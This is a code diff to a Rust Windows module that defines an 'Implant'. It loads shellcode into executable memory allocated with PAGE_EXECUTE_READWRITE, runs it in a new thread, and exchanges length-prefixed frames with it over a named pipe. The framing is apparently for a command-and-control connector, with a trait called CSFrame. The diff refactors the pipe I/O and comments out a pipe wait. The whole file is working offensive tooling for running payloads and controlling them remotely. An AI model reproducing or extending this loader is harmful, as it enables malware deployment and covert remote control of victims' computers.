@@ -1,10 +1,10 @@
 use std::{
     ffi::c_void,
-    io::{Error, ErrorKind},
+    io::{Error, ErrorKind, Read, Write},
     mem, ptr,
 };
 use windows::{
-    core::{Error as WinError, PCSTR},
+    core::PCSTR,
     Win32::{
         Foundation::{CloseHandle, HANDLE},
         Storage::FileSystem::{
@@ -13,7 +13,7 @@ use windows::{
         },
         System::{
             Memory::{VirtualAlloc, MEM_COMMIT, PAGE_EXECUTE_READWRITE},
-            Pipes::WaitNamedPipeA,
+            // Pipes::WaitNamedPipeA,
             Threading::{
                 CreateThread, LPTHREAD_START_ROUTINE, THREAD_CREATE_RUN_IMMEDIATELY,
             },
@@ -32,52 +32,89 @@ impl Drop for Implant {
         }
     }
 }
-impl Implant {
-    pub fn read(&self, size: usize) -> Result<Vec<u8>, Error> {
-        let mut out: Vec<u8> = vec![0; size];
+
+impl Read for Implant {
+    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
+        let size = buf.len();
         let mut bytes_read: u32 = 0;
         unsafe {
-            if ReadFile(
+            if !ReadFile(
                 self.handle,
-                out.as_mut_ptr() as *mut c_void,
+                buf.as_mut_ptr() as *mut c_void,
                 size.try_into().unwrap_or(u32::MAX),
                 &mut bytes_read as *mut u32,
                 ptr::null_mut() as *mut OVERLAPPED,
             )
             .as_bool()
             {
-                out.truncate(bytes_read.try_into().unwrap());
-                return Ok(out);
-            } else {
-                return Err(WinError::from_win32().into());
+                return Err(Error::new(ErrorKind::Other, "Failed to read from pipe"));
             };
-        }
+        };
+        return Ok(bytes_read.try_into().or(Err(Error::new(
+            ErrorKind::Other,
+            "Failed to convert u32 to usize",
+        )))?);
     }
+}
 
-    pub fn write(&self, data: Vec<u8>) -> Result<u32, Error> {
+impl Write for Implant {
+    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
         let mut bytes_written: u32 = 0;
         unsafe {
-            if WriteFile(
+            if !WriteFile(
                 self.handle,
-                data.as_ptr() as *const c_void,
-                data.len().try_into().unwrap_or(u32::MAX),
+                buf.as_ptr() as *const c_void,
+                buf.len().try_into().unwrap_or(u32::MAX),
                 &mut bytes_written as *mut u32,
                 ptr::null_mut() as *mut OVERLAPPED,
             )
             .as_bool()
             {
-                return Ok(bytes_written);
-            } else {
-                return Err(WinError::from_win32().into());
+                return Err(Error::new(ErrorKind::Other, "Failed to write to pipe"));
             };
         }
+        return Ok(bytes_written.try_into().or(Err(Error::new(
+            ErrorKind::Other,
+            "Failed to convert u32 to usize",
+        )))?);
+    }
+
+    fn flush(&mut self) -> std::io::Result<()> {
+        return Ok(());
+    }
+}
+
+pub trait CSFrame {
+    fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>>;
+    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>>;
+}
+
+impl<T> CSFrame for T
+where
+    T: Read + Write,
+{
+    fn read_frame(&mut self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+        let mut size_buf = [0; 4];
+        self.read_exact(&mut size_buf)?;
+        let size = u32::from_le_bytes(size_buf);
+        let mut data = vec![0; size.try_into()?];
+        self.read_exact(data.as_mut_slice())?;
+        return Ok(data);
+    }
+
+    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
+        let size: u32 = data.len().try_into()?;
+        self.write_all(&size.to_le_bytes())?;
+        self.write_all(&data)?;
+        return Ok(());
     }
 }
 
 pub fn create_implant_from_buf(
     shell_code: Vec<u8>,
-    socket_path: &str,
+    pipename: &str,
 ) -> Result<Implant, Error> {
+    let full_pipename = format!("\\\\.\\pipe\\{}", pipename);
     unsafe {
         let buf =
             VirtualAlloc(ptr::null(), 512 * 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
@@ -95,11 +132,12 @@ pub fn create_implant_from_buf(
             THREAD_CREATE_RUN_IMMEDIATELY,
             &mut threadid as *mut u32,
         )?;
-        if !WaitNamedPipeA(PCSTR(socket_path.as_ptr()), 0).as_bool() {
-            return Err(Error::new(ErrorKind::TimedOut, "Failed waiting for pipe"));
-        }
+
+        // if !WaitNamedPipeA(PCSTR(full_pipename.as_ptr()), 0).as_bool() {
+        //     return Err(Error::new(ErrorKind::TimedOut, "Failed waiting for pipe"));
+        // }
         let sock_handle = CreateFileA(
-            PCSTR(socket_path.as_ptr()),
+            PCSTR(full_pipename.as_ptr()),
             FILE_GENERIC_READ | FILE_GENERIC_WRITE,
             FILE_SHARE_READ | FILE_SHARE_WRITE,
             ptr::null(),
